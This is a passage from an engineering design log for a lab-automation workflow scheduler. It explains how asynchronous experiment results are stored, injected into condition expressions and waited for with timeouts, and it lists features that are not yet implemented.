**Trigger**: the user proposed "query the results of the experiments that are currently
running; the results may be produced asynchronously, and are queried, processed and used
for dynamic updates when they are needed"

### First, distinguish three kinds of "query"

| What is queried | What is needed | Risk |
|---|---|---|
| **① Asynchronous results of this system** | **A result table + variable injection** | ✅ None |
| ② Real-time state of this system | A restricted query API | ✅ Low |
| ③ An external system (LIMS) | A script + whitelist | 🟠 Medium |

**The user's scenario is ①**, so **no code upload and no sandbox are needed**.

### The solution

**① The `run_result` table stores asynchronous results**

```sql
run_result (run_id, node_id, result_key, payload jsonb, source, created_at)
UNIQUE (tenant_id, run_id, result_key)
```

**② Variable injection: injected before every node executes**

```
results.readPlate.od        = 0.65
results.readPlate.plate     = "PL-001"
results.readPlate.__exists  = true
```

**③ The expression refers to it directly**

```json
{ "condition": "${results.readPlate.od > 0.5}" }
```

**④ When the result has not arrived yet, wait**

```json
{ "waitFor": { "results": ["readPlate"], "timeoutMs": 600000,
               "pollMs": 2000, "onTimeout": "pause" } }
```

### Three design points

**1. Resources must be released while waiting**

```
During the 10-minute wait, the robot arm, the channels and the positions must all be released
Only the device lock is kept (the plate may still be inside the device)
run.status = 'waiting_result'
```

**If they are not released, a 10-minute wait deadlocks the whole island.**

**2. Distinguish "has not arrived" from "the value is null"**

```
results.readPlate.__exists = false   ← the result has not arrived yet
```

**Or use the `has('readPlate')` function**.

**Otherwise the expression evaluation reports "variable not defined", which hides the
real situation.**

**3. Results have a validity period**

```json
{ "output": "readPlate", "validForMs": 7200000 }
```

**For an expired result `has()` returns false**.

**Why**: using a plate-reading result from 2 hours ago to decide positive/negative
**may mean the basis has already expired without anyone knowing**.

### The default `onTimeout` = pause

| Value | Behaviour | Applicable when |
|---|---|---|
| fail | The execution fails | Simple, but it needs a manual re-run |
| skip | Continue as if there were no result | It may take the wrong branch |
| **pause** ⭐ | Pause and wait for a human | The result matters |

**pause is the default** — a result is often the basis of a decision, and guessing wrong
is expensive.

### Implementation: M1 grows by 3 days

| Task | Estimate |
|---|---|
| The `run_result` table + writing from the output configuration | 1 day |
| Variable injection (`results.<key>.<field>`) | 1 day |
| `waitFor` + polling + timeout + releasing resources | 1 day |
| The `has()` built-in function | 0.5 days |

**M1 goes from 1.75 → 2.1 weeks.**

### The relationship to scripts

```java
if (requirement can be expressed as "arithmetic over existing variables") {
    expression;              // safe, fast
} else if (requirement is "query this system's results/status") {
    waitFor + variable injection;   // safe, moderately fast
} else {
    script;                  // risky, slow
}
```

**The user's scenario falls into the second category, so no script is needed.**

---

## Appendix B. Known unimplemented items (continuously updated)

> The original number was D9. Review 20261102-02 R1 found that "how to use this
> document" had wrongly taken D109, and that this section had jumped to the end; it was
> changed to Appendix A / Appendix B. **The number D9 is deliberately left unused** to
> avoid renumbering (D109-D119 are referenced heavily by the review packages and the
> development log, and renumbering would invalidate those references).

**Recorded here so that later nobody wrongly believes it is already done**:

| Item | Status | Impact |
|---|---|---|
| The `returnTo` field | **Not implemented** (design only) | A return-path deadlock can still occur |
| Re-planning after a branch | **Not implemented** | The resources of an unselected branch are not released |
| The look-ahead scan | **Not implemented** | Conflicts cannot be found in advance |
| Duration interval estimation | **Partial** (`duration_model` has a base value, but the pessimistic value is not used) | The TTL can expire midway |
| Explicit parameter passing (instead of ThreadLocal) | **Not done** | It relies on finally-block cleanup, so there is a risk of omission |
| The one-off 6.5 second overhead | **Not located** | The throughput is locked down by it |

---

## Appendix A. How to use this document

**When a newcomer takes over**:

1. Start with the **D108 decision summary table** (5 minutes for the whole picture)
2. When you hit a "why not XX" question, look up the corresponding D number
3. **Read Appendix B before changing the design** — it may be that "you thought it was
   already done, but there is only a design"

**At review time**:

Every kind of decision has to be put to the test: **"if we did it again, would we still
choose this?"**
If the answer is "no", the constraints at the time have changed, a new decision has to
be made and **this document has to be updated**.
